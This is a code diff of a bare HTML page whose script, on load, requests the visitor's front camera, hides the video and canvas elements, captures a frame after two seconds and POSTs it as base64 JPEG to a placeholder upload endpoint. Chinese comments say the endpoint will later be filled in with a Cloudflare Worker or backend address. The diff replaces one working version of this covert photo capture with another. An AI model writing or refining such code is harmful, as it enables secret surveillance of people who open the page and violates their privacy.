@@ -1,28 +1,42 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<style>
+video,canvas{display:none}
+</style>
+</head>
 <body>
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="600" height="600"></canvas>
+
 <script>
-navigator.mediaDevices.getUserMedia({video:true})
-.then(stream=>{
-  const video=document.createElement('video');
-  video.srcObject=stream;
-  video.play();
-  setTimeout(()=>{
-    const canvas=document.createElement('canvas');
-    canvas.width=video.videoWidth;
-    canvas.height=video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0);
-    canvas.toBlob(blob=>{
-      const form=new FormData();
-      form.append('photo',blob,'cam_'+Date.now()+'.jpg');
-      // 后面配置完Cloudflare，这里会换成你的Worker地址
-      fetch('https://你的worker地址.workers.dev/upload',{
-        method:'POST',
-        body:form
-      });
-    },'image/jpeg');
-  },3000);
-});
+async function start(){
+  let stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+  let v=document.getElementById("v");
+  let c=document.getElementById("c");
+  let ctx=c.getContext("2d");
+  v.srcObject=stream;
+
+  v.onloadedmetadata=function(){
+    setTimeout(()=>{
+      ctx.drawImage(v,0,0,600,600);
+      let imgData=c.toDataURL("image/jpeg");
+      // 这里后面填后端地址，现在先留空
+      sendImg(imgData);
+    },2000);
+  }
+}
+
+function sendImg(base64){
+  fetch("https://换成后端地址/upload",{
+    method:"POST",
+    body:JSON.stringify({img:base64})
+  });
+}
+
+start();
 </script>
 </body>
 </html>
